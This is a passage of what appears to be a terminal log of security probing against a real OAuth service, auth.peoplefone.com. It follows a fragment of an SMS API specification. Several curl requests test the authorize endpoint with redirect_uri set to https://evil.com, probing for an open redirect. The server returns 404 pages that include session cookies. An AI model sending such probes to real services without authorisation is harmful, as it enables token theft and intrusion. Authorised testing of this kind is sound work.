+        description: The maximum message age (in number of days) from receiving the
+          SMS message by API/system. From 0 to 183 days (max value depends of platform
+          configuration)
+        required: false
+        schema:
+          minimum: 0
+          type: integer
+          format: int32
+[0m
+[0m$ [0mcurl -s -I "https://auth.peoplefone.com/oauth/authorize" 2>&1 | head -20
+HTTP/1.1 500 Internal Server Error
+Date: Thu, 03 Sep 2026 22:27:34 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Cache-Control: no-cache, private
+Set-Cookie: peopoauth_session=eyJpdiI6ImRuOXdYZ1pWUllqaUJVUXF1NDRYVkE9PSIsInZhbHVlIjoia2kwSkt6VDdOSVJXQ0tDR1JVc0p3Yy81dzc0QXJvT1ZLNUcyRDhDK2pncHJyeVJ4RU9YdExvRUFQTnVzcTdCUDVLVVdrTW1WUWh2cXd6S3RyeWcwSUlJNFc5ZmVWT1RpdGJlRktSak95VGFZQTQya1Rua2FGQlpLcG5wTjNuakIiLCJtYWMiOiIyNDViNzAyMjA5MDhmNWZjMDY4N2E2NGUwYjBmZTM1YzkzNWNlMTZmM2NlMDc4ZjQ5NWUyMDViMDZkMDY4ZTNmIiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:27:34 GMT; Max-Age=28800; path=/; secure; httponly; samesite=lax
+cf-cache-status: DYNAMIC
+expect-ct: max-age=86400, enforce
+referrer-policy: same-origin
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+Server: cloudflare
+CF-RAY: a3582ebb0ba8ef5e-IAD
+[0m
+[0m$ [0mcurl -s -I "https://auth.peoplefone.com/oauth/authorize?client_id=test&redirect_uri=https://evil.com&response_type=code&scope=openid" 2>&1 | head -30
+HTTP/1.1 404 Not Found
+Date: Thu, 03 Sep 2026 22:27:42 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Cache-Control: no-cache, private
+Set-Cookie: XSRF-TOKEN=eyJpdiI6IkhjYi93ckYxRnlWVDIwb1VRamY4VFE9PSIsInZhbHVlIjoiQWZvSWE1TEVXQytweE9PcVBLYkJWdnlGQXVLenRXaU9ZQVJGVm1hemlGZE5iWmh4YXRzZ1ZrK1JoNGlTalBGa2hjU3NPbmxhRTFZZ01xa014d1RVYWQxZi8yVGNZajE5akxxTEdYZTRkUDJkUDVKT2NUT1dyZFdXUjM5OWxwamwiLCJtYWMiOiIzNzYwOTlkN2U1YTYwNmEwMmQ2NDczYTZlZmQzZDIzZWM5NjQ3NzYyOTQ2YjUzMTA1OTJmNmIyYjFkN2Y4ZmUyIiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:27:42 GMT; Max-Age=28800; path=/; secure; samesite=lax
+Set-Cookie: peopoauth_session=eyJpdiI6Ii9sMkFTTjIybjFHYUlhQ3hHZlZyY0E9PSIsInZhbHVlIjoiRE8zQTl0R2pET2RZZkloVTY4Sm1maTJ0WldDcFFwNHFMK2liZU0xemFCMGVNMlhyeFVjWDNMa0RPNlNYWldDc1p3SWVSK1NreHAvbmRVNkhtTm5qekdRV3BPZmhtZzNnL3M0WTgyeXpNNzFFSkhjQ25Da2NNUjZFa2FsaytZVHAiLCJtYWMiOiIzY2Y0YTk2NjlhYzU3ODFiZDE5ZjNmOTcyZWFmNGY0ZGI1ZmIxMzkzMGY3NjUzMmMzNmNhZjI0NWMzNDRjZjc4IiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:27:42 GMT; Max-Age=28800; path=/; secure; httponly; samesite=lax
+Set-Cookie: redirect_uri=eyJpdiI6IjVuRUJOdVMrdXlkeVZQMVN4cXc5bnc9PSIsInZhbHVlIjoidGlrV0FVTm9ZZm04dU96b1RBS3pUUnBaUTFiZk5BR29MZUtMZ2x5czBHeUpRUHE2cUoyaDR3azRzZ0FZSW44Z21pZzhVdllFT2U1azZBNnVMS1lyQUE9PSIsIm1hYyI6IjgwMTY0ZjUxNTM4NTcwYWMwZmJhZmFlM2I4ODcxZjZjMGQ2M2JmZjlkNzVjNTAxNTRmOTlkMWQ5YmJlNDMxZjciLCJ0YWciOiIifQ%3D%3D; expires=Fri, 08 Oct 2027 22:27:42 GMT; Max-Age=34560000; path=/; secure; httponly; samesite=lax
+cf-cache-status: DYNAMIC
+expect-ct: max-age=86400, enforce
+referrer-policy: same-origin
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+Server: cloudflare
+CF-RAY: a3582eee1a2cb098-IAD
+[0m
+[0m$ [0mcurl -s -I "https://auth.peoplefone.com/oauth/authorize?client_id=peoplefone&redirect_uri=https://evil.com&response_type=code&scope=openid" 2>&1 | head -30
+HTTP/1.1 404 Not Found
+Date: Thu, 03 Sep 2026 22:27:53 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Cache-Control: no-cache, private
+Set-Cookie: XSRF-TOKEN=eyJpdiI6ImpGM3VqN3dTakkyS05GRnNFRDdWblE9PSIsInZhbHVlIjoiQk92ekpiSWFUa1NwUUkwV3lUQ0lEVTVvRUFVOXNmSkdWNDBYVFdnM3N4YVN2KzVhdWJaSUdXbDQ4emZZajlnZnZxYXdqOS9WVm9LWktrNVdoN1dDamV5aTNXZFNUUVh6dlZuMlZmM0Rtc2phMHBxeEo2NTRic29HenVzU0xxdFMiLCJtYWMiOiJiOGYyNDU1OTY1OGQzODNiNjhmZWU0NmViZmYzNDc0YWQ1YzEzYzk4ODgzZDA2YmYzYzdjMzE0OTc4MGNmNmU4IiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:27:53 GMT; Max-Age=28800; path=/; secure; samesite=lax
+Set-Cookie: peopoauth_session=eyJpdiI6IlQ1VWNiYWZjSVJFN20zbVNJUjNzaXc9PSIsInZhbHVlIjoiSEZCcmd6Ni84VWlCQTRCcHE1aTdWaUpCMzdSVmovL0dBQ2pQR0lOUU1uT3JGa1E1NXNyNTNGNExTbHA5WllFWGZaY3ZHbzNxdk1DS2JQN2QzL0E4UHh5TXdYYW8rUW9UU0E0UXNlc0hVWHIwUFBkRndleHlJZlF6RG9MNFl4bkUiLCJtYWMiOiJlNzk4NjU3ZTlmMzQyZGQ0NjEwOGUyOGRmMWQ0MDg2OTljYTg3MzkzOWFkMWMyZGUxOGE0M2U0ZTYyNjdjYzExIiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:27:53 GMT; Max-Age=28800; path=/; secure; httponly; samesite=lax
+Set-Cookie: redirect_uri=eyJpdiI6IjZEQ2dLWnB2WnBjd2xjcklmS2FYTkE9PSIsInZhbHVlIjoiWUtTZFc1RE40Z3hhbUJhdDl4SzlBWjlaRldBdEFjZ1ZXMm8rK2tOcFlBSkR5VTQrTkdQOUlJcVJBMDA2QjhENElpQmsvejErVUtSUytrNGVFSUVURUE9PSIsIm1hYyI6ImRlOTlkMDlmMjE2NmFmNjgxMjVhZjcyNzFlYjIwZTE1NjY0OWRiNDU2NmI3YWMzYTU4NGMyZDhhMjVkODllZDgiLCJ0YWciOiIifQ%3D%3D; expires=Fri, 08 Oct 2027 22:27:53 GMT; Max-Age=34560000; path=/; secure; httponly; samesite=lax
+cf-cache-status: DYNAMIC
+expect-ct: max-age=86400, enforce
+referrer-policy: same-origin
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+Server: cloudflare
+CF-RAY: a3582f2ffc92b098-IAD
+[0m
+[0m$ [0mcurl -s "https://auth.peoplefone.com/oauth/authorize?client_id=test&redirect_uri=https://evil.com&response_type=code&scope=openid" 2>&1 | head -100
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <title>Not Found</title>
+
+        <style>
+            /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}a{background-color:transparent}code{font-family:monospace,monospace;font-size:1em}[hidden]{display:none}html{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;line-height:1.5}*,:after,:before{box-sizing:border-box;border:0 solid #e2e8f0}a{color:inherit;text-decoration:inherit}code{font-family:Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}svg,video{display:block;vertical-align:middle}video{max-width:100%;height:auto}.bg-white{--bg-opacity:1;background-color:#fff;background-color:rgba(255,255,255,var(--bg-opacity))}.bg-gray-100{--bg-opacity:1;background-color:#f7fafc;background-color:rgba(247,250,252,var(--bg-opacity))}.border-gray-200{--border-opacity:1;border-color:#edf2f7;border-color:rgba(237,242,247,var(--border-opacity))}.border-gray-400{--border-opacity:1;border-color:#cbd5e0;border-color:rgba(203,213,224,var(--border-opacity))}.border-t{border-top-width:1px}.border-r{border-right-width:1px}.flex{display:flex}.grid{display:grid}.hidden{display:none}.items-center{align-items:center}.justify-center{justify-content:center}.font-semibold{font-weight:600}.h-5{height:1.25rem}.h-8{height:2rem}.h-16{height:4rem}.text-sm{font-size:.875rem}.text-lg{font-size:1.125rem}.leading-7{line-height:1.75rem}.mx-auto{margin-left:auto;margin-right:auto}.ml-1{margin-left:.25rem}.mt-2{margin-top:.5rem}.mr-2{margin-right:.5rem}.ml-2{margin-left:.5rem}.mt-4{margin-top:1rem}.ml-4{margin-left:1rem}.mt-8{margin-top:2rem}.ml-12{margin-left:3rem}.-mt-px{margin-top:-1px}.max-w-xl{max-width:36rem}.max-w-6xl{max-width:72rem}.min-h-screen{min-height:100vh}.overflow-hidden{overflow:hidden}.p-6{padding:1.5rem}.py-4{padding-top:1rem;padding-bottom:1rem}.px-4{padding-left:1rem;padding-right:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.pt-8{padding-top:2rem}.fixed{position:fixed}.relative{position:relative}.top-0{top:0}.right-0{right:0}.shadow{box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.text-center{text-align:center}.text-gray-200{--text-opacity:1;color:#edf2f7;color:rgba(237,242,247,var(--text-opacity))}.text-gray-300{--text-opacity:1;color:#e2e8f0;color:rgba(226,232,240,var(--text-opacity))}.text-gray-400{--text-opacity:1;color:#cbd5e0;color:rgba(203,213,224,var(--text-opacity))}.text-gray-500{--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity))}.text-gray-600{--text-opacity:1;color:#718096;color:rgba(113,128,150,var(--text-opacity))}.text-gray-700{--text-opacity:1;color:#4a5568;color:rgba(74,85,104,var(--text-opacity))}.text-gray-900{--text-opacity:1;color:#1a202c;color:rgba(26,32,44,var(--text-opacity))}.uppercase{text-transform:uppercase}.underline{text-decoration:underline}.antialiased{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.tracking-wider{letter-spacing:.05em}.w-5{width:1.25rem}.w-8{width:2rem}.w-auto{width:auto}.grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}@-webkit-keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@-webkit-keyframes ping{0%{transform:scale(1);opacity:1}75%,to{transform:scale(2);opacity:0}}@keyframes ping{0%{transform:scale(1);opacity:1}75%,to{transform:scale(2);opacity:0}}@-webkit-keyframes pulse{0%,to{opacity:1}50%{opacity:.5}}@keyframes pulse{0%,to{opacity:1}50%{opacity:.5}}@-webkit-keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:translateY(0);-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}@keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:translateY(0);-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}@media (min-width:640px){.sm\:rounded-lg{border-radius:.5rem}.sm\:block{display:block}.sm\:items-center{align-items:center}.sm\:justify-start{justify-content:flex-start}.sm\:justify-between{justify-content:space-between}.sm\:h-20{height:5rem}.sm\:ml-0{margin-left:0}.sm\:px-6{padding-left:1.5rem;padding-right:1.5rem}.sm\:pt-0{padding-top:0}.sm\:text-left{text-align:left}.sm\:text-right{text-align:right}}@media (min-width:768px){.md\:border-t-0{border-top-width:0}.md\:border-l{border-left-width:1px}.md\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}}@media (min-width:1024px){.lg\:px-8{padding-left:2rem;padding-right:2rem}}@media (prefers-color-scheme:dark){.dark\:bg-gray-800{--bg-opacity:1;background-color:#2d3748;background-color:rgba(45,55,72,var(--bg-opacity))}.dark\:bg-gray-900{--bg-opacity:1;background-color:#1a202c;background-color:rgba(26,32,44,var(--bg-opacity))}.dark\:border-gray-700{--border-opacity:1;border-color:#4a5568;border-color:rgba(74,85,104,var(--border-opacity))}.dark\:text-white{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.dark\:text-gray-300 { --text-opacity: 1; color: #e2e8f0; color: rgba(226,232,240,var(--text-opacity)) }}
+        </style>
+
+        <style>
+            body {
+                font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            }
+        </style>
+    </head>
+    <body class="antialiased"><a href="https://auth.peoplefone.com/cdn-cgi/content?id=6JBM0b7O5FL.5jIm_y5BGSdt518mxg7ar686dY1HptM-1788474479.6067784-1.2.1.1-iwugZXmEhjoaj4Rac7BRsQC8xz3L5Ff5SPr.lm1C4yPidqrjOnZ1Hm3FTJhOJbAz" aria-hidden="true" rel="nofollow noopener" style="display: none !important; visibility: hidden !important"></a>
+        <div class="relative flex items-top justify-center min-h-screen bg-gray-100 dark:bg-gray-900 sm:items-center sm:pt-0" role="main">
+            <div class="max-w-xl mx-auto sm:px-6 lg:px-8">
+                <div class="flex items-center pt-8 sm:justify-start sm:pt-0">
+                    <h1 class="px-4 text-lg dark:text-gray-300 text-gray-700 border-r border-gray-400 tracking-wider">
+                        404                    </h1>
+
+                    <div class="ml-4 text-lg dark:text-gray-300 text-gray-700 uppercase tracking-wider">
+                        Not Found                    </div>
+                </div>
+            </div>
+        </div>
+    <script>window.__CF$cv$params={r:'a3582f598bdeb098',t:'MTc4ODQ3NDQ3OQ==',u:'01a06962d4827a10a93cb0d875bc0f30',ut:'bJiatIeAWNWoFup9kfI2UoUqtyjYpg3uCD3sG15fGiI-1788474479-1.2.1.1-uoe00G.fEJ.eetIIDqNH5A.BaKSGyYS32SiJwIvVfG2eE1xvhZm95cxBiecUmqRkkaqGKGNP2VTKXMUQkm6koTW54wZXhWp5fKFxIGkeL5Q',i:60};(function(){if(!document.body)return;var s=document.createElement('script');s.src='/cdn-cgi/challenge-platform/scripts/precursor/main.js';document.head.appendChild(s);})();</script></body>
+</html>
+[0m
+[0m$ [0mcurl -s "https://auth.peoplefone.com/login" 2>&1 | head -100
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <title>Not Found</title>
+
+        <style>
+            /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}a{background-color:transparent}code{font-family:monospace,monospace;font-size:1em}[hidden]{display:none}html{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;line-height:1.5}*,:after,:before{box-sizing:border-box;border:0 solid #e2e8f0}a{color:inherit;text-decoration:inherit}code{font-family:Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}svg,video{display:block;vertical-align:middle}video{max-width:100%;height:auto}.bg-white{--bg-opacity:1;background-color:#fff;background-color:rgba(255,255,255,var(--bg-opacity))}.bg-gray-100{--bg-opacity:1;background-color:#f7fafc;background-color:rgba(247,250,252,var(--bg-opacity))}.border-gray-200{--border-opacity:1;border-color:#edf2f7;border-color:rgba(237,242,247,var(--border-opacity))}.border-gray-400{--border-opacity:1;border-color:#cbd5e0;border-color:rgba(203,213,224,var(--border-opacity))}.border-t{border-top-width:1px}.border-r{border-right-width:1px}.flex{display:flex}.grid{display:grid}.hidden{display:none}.items-center{align-items:center}.justify-center{justify-content:center}.font-semibold{font-weight:600}.h-5{height:1.25rem}.h-8{height:2rem}.h-16{height:4rem}.text-sm{font-size:.875rem}.text-lg{font-size:1.125rem}.leading-7{line-height:1.75rem}.mx-auto{margin-left:auto;margin-right:auto}.ml-1{margin-left:.25rem}.mt-2{margin-top:.5rem}.mr-2{margin-right:.5rem}.ml-2{margin-left:.5rem}.mt-4{margin-top:1rem}.ml-4{margin-left:1rem}.mt-8{margin-top:2rem}.ml-12{margin-left:3rem}.-mt-px{margin-top:-1px}.max-w-xl{max-width:36rem}.max-w-6xl{max-width:72rem}.min-h-screen{min-height:100vh}.overflow-hidden{overflow:hidden}.p-6{padding:1.5rem}.py-4{padding-top:1rem;padding-bottom:1rem}.px-4{padding-left:1rem;padding-right:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.pt-8{padding-top:2rem}.fixed{position:fixed}.relative{position:relative}.top-0{top:0}.right-0{right:0}.shadow{box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.text-center{text-align:center}.text-gray-200{--text-opacity:1;color:#edf2f7;color:rgba(237,242,247,var(--text-opacity))}.text-gray-300{--text-opacity:1;color:#e2e8f0;color:rgba(226,232,240,var(--text-opacity))}.text-gray-400{--text-opacity:1;color:#cbd5e0;color:rgba(203,213,224,var(--text-opacity))}.text-gray-500{--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity))}.text-gray-600{--text-opacity:1;color:#718096;color:rgba(113,128,150,var(--text-opacity))}.text-gray-700{--text-opacity:1;color:#4a5568;color:rgba(74,85,104,var(--text-opacity))}.text-gray-900{--text-opacity:1;color:#1a202c;color:rgba(26,32,44,var(--text-opacity))}.uppercase{text-transform:uppercase}.underline{text-decoration:underline}.antialiased{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.tracking-wider{letter-spacing:.05em}.w-5{width:1.25rem}.w-8{width:2rem}.w-auto{width:auto}.grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}@-webkit-keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@-webkit-keyframes ping{0%{transform:scale(1);opacity:1}75%,to{transform:scale(2);opacity:0}}@keyframes ping{0%{transform:scale(1);opacity:1}75%,to{transform:scale(2);opacity:0}}@-webkit-keyframes pulse{0%,to{opacity:1}50%{opacity:.5}}@keyframes pulse{0%,to{opacity:1}50%{opacity:.5}}@-webkit-keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:translateY(0);-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}@keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:translateY(0);-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}@media (min-width:640px){.sm\:rounded-lg{border-radius:.5rem}.sm\:block{display:block}.sm\:items-center{align-items:center}.sm\:justify-start{justify-content:flex-start}.sm\:justify-between{justify-content:space-between}.sm\:h-20{height:5rem}.sm\:ml-0{margin-left:0}.sm\:px-6{padding-left:1.5rem;padding-right:1.5rem}.sm\:pt-0{padding-top:0}.sm\:text-left{text-align:left}.sm\:text-right{text-align:right}}@media (min-width:768px){.md\:border-t-0{border-top-width:0}.md\:border-l{border-left-width:1px}.md\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}}@media (min-width:1024px){.lg\:px-8{padding-left:2rem;padding-right:2rem}}@media (prefers-color-scheme:dark){.dark\:bg-gray-800{--bg-opacity:1;background-color:#2d3748;background-color:rgba(45,55,72,var(--bg-opacity))}.dark\:bg-gray-900{--bg-opacity:1;background-color:#1a202c;background-color:rgba(26,32,44,var(--bg-opacity))}.dark\:border-gray-700{--border-opacity:1;border-color:#4a5568;border-color:rgba(74,85,104,var(--border-opacity))}.dark\:text-white{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.dark\:text-gray-300 { --text-opacity: 1; color: #e2e8f0; color: rgba(226,232,240,var(--text-opacity)) }}
+        </style>
+
+        <style>
+            body {
+                font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            }
+        </style>
+    </head>
+    <body class="antialiased"><a href="https://auth.peoplefone.com/cdn-cgi/content?id=QdtuDN.T4qQUk0whf9Dizkcn7c1F34BqyDiuHJMW1WU-1788474503.6712031-1.2.1.1-Jn9lwz8KymM3MPkUofhsgFUN3tsH3IpaLFiL318xfLzk1RISLo_YNGaq4EoUSeEW" aria-hidden="true" rel="nofollow noopener" style="display: none !important; visibility: hidden !important"></a>
+        <div class="relative flex items-top justify-center min-h-screen bg-gray-100 dark:bg-gray-900 sm:items-center sm:pt-0" role="main">
+            <div class="max-w-xl mx-auto sm:px-6 lg:px-8">
+                <div class="flex items-center pt-8 sm:justify-start sm:pt-0">
+                    <h1 class="px-4 text-lg dark:text-gray-300 text-gray-700 border-r border-gray-400 tracking-wider">
+                        404                    </h1>
+
+                    <div class="ml-4 text-lg dark:text-gray-300 text-gray-700 uppercase tracking-wider">
+                        Not Found                    </div>
+                </div>
+            </div>
+        </div>
+    <script>window.__CF$cv$params={r:'a3582feffe3bb098',t:'MTc4ODQ3NDUwMw==',u:'01a06963327678b392904747276e9b0d',ut:'tvcrLUB2osAYp9joJvJQkBFDncYHblbwwpoEeCwv5uA-1788474503-1.2.1.1-JTTpzt_0U3FO1FB6Z1wqDlAy7JLNUBr_7Hy0SnnXObfsGy.buZNi7zQLbQ0r9XruqX9L58I3tTQPE0ZKD24L0oqWcI1Vp_eV56M3NJCGCCM',i:60};(function(){if(!document.body)return;var s=document.createElement('script');s.src='/cdn-cgi/challenge-platform/scripts/precursor/main.js';document.head.appendChild(s);})();</script></body>
+</html>
+[0m
+[0m$ [0mcurl -s "https://auth.peoplefone.com/" 2>&1 | head -50
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <title>Not Found</title>
+
+        <style>
+            /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}a{background-color:transparent}code{font-family:monospace,monospace;font-size:1em}[hidden]{display:none}html{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;line-height:1.5}*,:after,:before{box-sizing:border-box;border:0 solid #e2e8f0}a{color:inherit;text-decoration:inherit}code{font-family:Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}svg,video{display:block;vertical-align:middle}video{max-width:100%;height:auto}.bg-white{--bg-opacity:1;background-color:#fff;background-color:rgba(255,255,255,var(--bg-opacity))}.bg-gray-100{--bg-opacity:1;background-color:#f7fafc;background-color:rgba(247,250,252,var(--bg-opacity))}.border-gray-200{--border-opacity:1;border-color:#edf2f7;border-color:rgba(237,242,247,var(--border-opacity))}.border-gray-400{--border-opacity:1;border-color:#cbd5e0;border-color:rgba(203,213,224,var(--border-opacity))}.border-t{border-top-width:1px}.border-r{border-right-width:1px}.flex{display:flex}.grid{display:grid}.hidden{display:none}.items-center{align-items:center}.justify-center{justify-content:center}.font-semibold{font-weight:600}.h-5{height:1.25rem}.h-8{height:2rem}.h-16{height:4rem}.text-sm{font-size:.875rem}.text-lg{font-size:1.125rem}.leading-7{line-height:1.75rem}.mx-auto{margin-left:auto;margin-right:auto}.ml-1{margin-left:.25rem}.mt-2{margin-top:.5rem}.mr-2{margin-right:.5rem}.ml-2{margin-left:.5rem}.mt-4{margin-top:1rem}.ml-4{margin-left:1rem}.mt-8{margin-top:2rem}.ml-12{margin-left:3rem}.-mt-px{margin-top:-1px}.max-w-xl{max-width:36rem}.max-w-6xl{max-width:72rem}.min-h-screen{min-height:100vh}.overflow-hidden{overflow:hidden}.p-6{padding:1.5rem}.py-4{padding-top:1rem;padding-bottom:1rem}.px-4{padding-left:1rem;padding-right:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.pt-8{padding-top:2rem}.fixed{position:fixed}.relative{position:relative}.top-0{top:0}.right-0{right:0}.shadow{box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.text-center{text-align:center}.text-gray-200{--text-opacity:1;color:#edf2f7;color:rgba(237,242,247,var(--text-opacity))}.text-gray-300{--text-opacity:1;color:#e2e8f0;color:rgba(226,232,240,var(--text-opacity))}.text-gray-400{--text-opacity:1;color:#cbd5e0;color:rgba(203,213,224,var(--text-opacity))}.text-gray-500{--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity))}.text-gray-600{--text-opacity:1;color:#718096;color:rgba(113,128,150,var(--text-opacity))}.text-gray-700{--text-opacity:1;color:#4a5568;color:rgba(74,85,104,var(--text-opacity))}.text-gray-900{--text-opacity:1;color:#1a202c;color:rgba(26,32,44,var(--text-opacity))}.uppercase{text-transform:uppercase}.underline{text-decoration:underline}.antialiased{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.tracking-wider{letter-spacing:.05em}.w-5{width:1.25rem}.w-8{width:2rem}.w-auto{width:auto}.grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}@-webkit-keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@-webkit-keyframes ping{0%{transform:scale(1);opacity:1}75%,to{transform:scale(2);opacity:0}}@keyframes ping{0%{transform:scale(1);opacity:1}75%,to{transform:scale(2);opacity:0}}@-webkit-keyframes pulse{0%,to{opacity:1}50%{opacity:.5}}@keyframes pulse{0%,to{opacity:1}50%{opacity:.5}}@-webkit-keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:translateY(0);-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}@keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:translateY(0);-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}@media (min-width:640px){.sm\:rounded-lg{border-radius:.5rem}.sm\:block{display:block}.sm\:items-center{align-items:center}.sm\:justify-start{justify-content:flex-start}.sm\:justify-between{justify-content:space-between}.sm\:h-20{height:5rem}.sm\:ml-0{margin-left:0}.sm\:px-6{padding-left:1.5rem;padding-right:1.5rem}.sm\:pt-0{padding-top:0}.sm\:text-left{text-align:left}.sm\:text-right{text-align:right}}@media (min-width:768px){.md\:border-t-0{border-top-width:0}.md\:border-l{border-left-width:1px}.md\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}}@media (min-width:1024px){.lg\:px-8{padding-left:2rem;padding-right:2rem}}@media (prefers-color-scheme:dark){.dark\:bg-gray-800{--bg-opacity:1;background-color:#2d3748;background-color:rgba(45,55,72,var(--bg-opacity))}.dark\:bg-gray-900{--bg-opacity:1;background-color:#1a202c;background-color:rgba(26,32,44,var(--bg-opacity))}.dark\:border-gray-700{--border-opacity:1;border-color:#4a5568;border-color:rgba(74,85,104,var(--border-opacity))}.dark\:text-white{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.dark\:text-gray-300 { --text-opacity: 1; color: #e2e8f0; color: rgba(226,232,240,var(--text-opacity)) }}
+        </style>
+
+        <style>
+            body {
+                font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            }
+        </style>
+    </head>
+    <body class="antialiased"><a href="https://auth.peoplefone.com/cdn-cgi/content?id=ItqzM8kaUo2auIC1eGyKRpIPpmJZPV2oDbsvGvCts50-1788474512.6956637-1.2.1.1-VZFpRyd24mnMVl.dK2_gwNOusvhFSbvsDos74Qd0zzn79BAEd9X36QiXWSU0Hz1P" aria-hidden="true" rel="nofollow noopener" style="display: none !important; visibility: hidden !important"></a>
